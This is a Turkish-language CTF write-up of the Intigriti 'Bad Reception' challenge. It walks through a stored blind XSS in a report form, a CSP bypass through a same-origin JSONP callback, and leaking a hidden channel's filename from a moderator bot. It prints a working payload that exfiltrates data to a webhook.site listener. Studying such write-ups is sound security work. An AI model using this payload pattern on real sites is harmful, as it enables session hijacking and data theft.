---
title: 'Bad Reception: Kör XSS, JSONP ve bir Bot ile Intigriti 0826 Çözümü'
description: 'Intigriti Ağustos 2026 challenge çözümü: report formunda stored blind XSS, CSPyi aşan same-origin JSONP endpointi ve moderatör botundan sızdırılan gizli kanal.'
pubDate: 2026-09-01
tags: ['ctf', 'xss', 'intigriti', 'csp-bypass', 'blind-xss', 'writeup']
cover: '/covers/badreception.jpg'
---

Intigriti'nin Ağustos ayı CTF challenge'ının adı **Bad Reception** idi. Karşımda eski model bir televizyon vardı: on kanal tuşu, hepsinde aynı parazit görüntüsü. Amaç tek cümle: "Make the TV work to capture the flag." Televizyonu çalıştır, flag'i yakala. Bu yazıda nasıl çözdüğümü anlatacağım.

Flag: `INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}`

## Zafiyetin özeti

Report formu (`POST /api/report`) `channelId` alanını tek bir kuralla doğruluyor: rakamla başlaması gerekiyor. İlk karakterden sonrası saklanıyor ve daha sonra dışarıdan erişilemeyen gizli bir moderasyon sayfasında (`/moderate/<id>`) HTML olarak render ediliyor. O sayfayı headless Chrome ile çalışan bir moderatör botu ziyaret ediyor. Sayfada içerik önce bir sanitizer'dan geçiyor, tüm inline event handler'lar siliniyor ama `<script>` etiketlerine izin veriliyor. Bir de CSP olarak `script-src 'self'` set edilmiş. Bu normalde saldırıyı öldürür, ancak sitenin kendi JSONP endpoint'i `callback` parametresini hiçbir doğrulamadan JavaScript olarak yansıtıyor ve aynı origin'den geldiği için CSP buna karışamıyor. Sonuç: kodum botun tarayıcısında çalışıyor, bot bana yasak olan 11. kanalı okuyor ve video dosyasının adını bana gönderiyor. Flag da o videonun içinde.

## Kurcalamaya başlıyorum

Sayfanın kaynak kodu çok küçük: kanal tuşları `GET /api/channels/{n}/load` isteği atıyor, gelen video adı `^[A-Za-z0-9._-]+\.mp4$` regex'iyle kontrol ediliyor, köşede de uyarı üçgeni şeklinde bir rapor butonu var.

```
GET  /api/channels/{n}/load   n=1..10 -> "static.mp4", n>10 -> 403 "channel not available"
POST /api/report              channelId=<rakam+her şey> -> {"id":"<16hex>","status":"queued"}
```

İki endpoint var; uygulamanın tamamı bu. İstemci JS'inin içinde ayrıca yorum satırına alınmış bir `X-Channel-Id` header'ı vardı. Yorum satırına alınmış kod geliştiricinin sana bir şey anlatma çabasıdır, önce onu inceledim. Sunucu bu header'ı tamamen yok sayıyormuş ama onu incelerken API'nin genelini öğrenmiş oldum.

## Her şeyi yutan form

`channelId` için tek kural vardı: rakamla başlaması. `1;id=1` kabul, `1<b>x</b>` kabul, hatta `1<svg>` bile kabul. İlk rakamdan sonrası hiç dokunulmadan saklanıyor.

Peki bu rapor sonra nerede gösteriliyor? Cevap bana bir rapor ID'si veriyor ama görüntüleme sayfasını bir türlü bulamıyorum. `/report/<id>`, `/reports/<id>`, `/api/report/<id>`, query string varyantları, `/challenge` altı yollar... Hepsini denedim, hepsi 404. Site kendi raporumu bana hiçbir yerde geri göstermiyor.

Geriye tek bir açıklama kalıyor: benim yazdıklarım, benim göremediğim bir yerde render ediliyor. İç rotanın varlığını da doğruladım; `GET /moderate/<id>` her ID için aynı şekilde çıplak bir `403 "forbidden"` dönüyor (9 baytlık, uygulama seviyesinde bir cevap; session olsun olmasın fark etmiyor). Bu eksik rota değil, gerçek bir sayfanın önündeki kapı. Ağın içinde raporlarımı açan biri var. O halde bu bir kör (blind) XSS.

## Üç tur sessizlik

webhook.site üzerinde bir dinleyici (listener) kurdum ve klasik blind XSS matrisini denedim: `img onerror`, `svg onload`, attribute kırma denemeleri, hiç JavaScript gerektirmeyen düz resim yüklemeleri. Hangi payload çalışırsa ayırt edebilmek için her birine farklı bir işaret koydum.

Hiçbir şey gelmedi. Payload'ları değiştirip ikinci turu attım, yine hiçbir şey. Üçüncü turda da aynı.

Burada dürüst olmam gerekirse gerçek zamanımı bu bölümde kaybettim: exploite güvenmeyi bırakıp altyapıdan şüphelenmeye başladım. Bot uyuyor olabilir mi? Botun internete çıkışı engelli olabilir mi? Dinleyicim mi bozuk? Dinleyiciyi baştan kurdum, farklı bir servise taşıdım, hatta içinde hiç JavaScript olmayan payload'lar bile yolladım. Hepsi sessiz.

Sebep tahmin ettiğimden çok daha basitti: o event handler'lar hiç var olmadı. Raporun render edildiği sayfada bir sanitizer (DOMPurify tarzı) çalışıyor ve `onerror`, `onload`, `onfocus` gibi tüm inline handler'ları sayfa daha ayrıştırılmadan siliyor. Benim payload'larım çalıştırılmıyor, daha doğmadan siliniyordu. Handler'lı resim yüklemelerinin de ölmesi bundandı. Hayatta kalabilecek tek şey, temizlenmeye değer bir attribute'u olmayan elementti.

## Gadget bir istek uzağındaymış

Sanitizer'dan kurtulan tek şey `<script>` etiketinin kendisiydi. Bu başlı başına bir bug: `script`'e izin veren bir sanitizer, o sayfa için sanitizer değildir. Ama CSP `script-src 'self'` olduğu sürece boş bir `<script>` hiçbir işe yaramaz. Bana lazım olan şey, bu origin'in kendisinden kontrolümdeki JavaScript'i döndüren bir adres. Endpoint listesine geri döndüm ve saatler önce sormam gereken soruyu sordum: bu sitede, benim yazdığım kodu JavaScript olarak veren bir URL var mı?

```
GET /api/jsonp?callback=alert(1)//

/**/ alert(1)//({"channels": 10});
```

Var. `callback` parametresi hiçbir doğrulamadan geçmeden cevaba yazılıyor ve `application/javascript` olarak dönüyor. Sondaki `//` ise endpoint'in kendi JSON kısmını yorum satırına çeviriyor. Script aynı origin'den geldiği için CSP'nin buna karışması söz konusu bile değil; `callback=`'den sonra ne yazarsam o benim kodum.

İlk denemede çalışan payload'ımı bozan küçük bir detay da şuydu: o URL'nin içindeki JavaScript'te `+` ve `&` karakterleri olmamalı. Body urlencoded olduğu için `+` boşluğa, `&` yeni bir parametreye dönüşüyor; ikisinden biri script'in `src`'sini sessizce bozuyor. Bu yüzden exfil URL'ini template literal ve tek query parametresiyle kurdum.

## Payload

`POST /api/report`'a `channelId` olarak gönderdim:

```
07<script src="/api/jsonp?callback=fetch('/api/channels/11/load').then(r=>r.text()).then(t=>fetch(`https://webhook.site/<my-uuid>?f=${t}`))//"></script>
```

Yaptığı iş şu: bot olarak 11. kanalın video adını çek ve bana gönder.

Birkaç saniye sonra webhook'a ilk istek düştü:

```
GET https://webhook.site/<my-uuid>?f=3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_0) ... Chrome/136.0.0.0 Safari/537.36
```

Bu istek her şeyi özetliyor aslında. Headless bir moderatör botu benim JavaScript'imi çalıştırdı, bana `403 channel not available` cevabı veren 11. kanalı kendi yetkisiyle okudu ve sonucu benim kontrol ettiğim adrese taşıdı. Bot on kanalla sınırlı değil; ben öyleyim. Resmi ipuçlarının işaret ettiği şey de tam olarak buydu: sinyali düzelt, kanal sınırını aş ve raporu başkasına baktır.

## Son adım: videoyu izlemek

Video adı düz bir statik dosyaya işaret ediyor. Auth yok, imza yok; onu saklayan tek şey isminin bilinmemesi:

```
GET /static/streams/3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4 -> 200 (15 KB)
```

15 kilobaytlık bir H.264 video. ffmpeg ile kare kare çıkardım ve 11. kanal sonunda net bir şekilde geldi:

![11. kanal sonunda net](/images/badreception-ch11.png)

Ekranda "CH 11" yazıyor, hemen altında flag: `INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}`

Televizyon sonunda çalışıyordu.

## Etkisi

Kimliği doğrulanmamış bir saldırgan, tek bir form göndererek uygulamanın kendi origin'inde moderatör botunun tarayıcısında istediği JavaScript'i çalıştırabiliyor. Botun yetkileri bu noktada devreye giriyor: normal kullanıcılara yasak olan bir kanalı okuyor, dışarıdan herkese kapalı olan dahili bir moderasyon sayfasına ulaşıyor. Sızdırılan video ise tek koruması isminin bilinmemesi olan herkese açık bir dosya; XSS bu korumayı doğrudan aşıyor. Rapor hız limiti istemcinin kontrol edebildiği bir session cookie'sine bağlı ve cookie'yi silerek aşılabiliyor, yani deneme sayısı fiilen sınırsız. Gerçek bir sistemde bu tablo şuna eşit olurdu: saldırgan botun oturumuna ve kimliğine binerek dahili endpoint'leri okur ve botun erişebildiği her şeyi dışarı sızdırır.

## Geçmişteki bana söyleyeceklerim

- Bir form her şeyi yutup hiçbir şeyi geri vermiyorsa, içerik başkasının tarayıcısında render ediliyordur. Dinleyiciyi erken kur ama sessizliği "bot bozuk" diye yorumlama; "payload'larım çalışmadan siliniyor" diye yorumla. İkisi birbirinin tam tersi iki sorun ve çözümleri de birbirinin tersi.
- Event handler'ların hepsi ölmüşse sanitizer ile savaşıyorsun demektir ve savaş attribute'lar değil element'ler üzerinedir.
- CSP `script-src 'self'` gördüğünde kazanç, politikayı daha akıllıca aşmak değil; izin verilen origin içinde sana JavaScript döndüren bir endpoint bulmaktır. Ben CSS ile karakter karakter veri sızdırma yöntemi kurmaya çalışırken JSONP endpoint'i bir HTTP isteği uzağımda duruyordu.
- Adını sızdırabildiğin "gizli" bir statik dosya erişim kontrolü değildir. Botun 11. kanala erişimi düzgün şekilde engellenmişti ama dosyanın kendisi değildi. İkisini birleştirince kapı sadece süs oluyor.
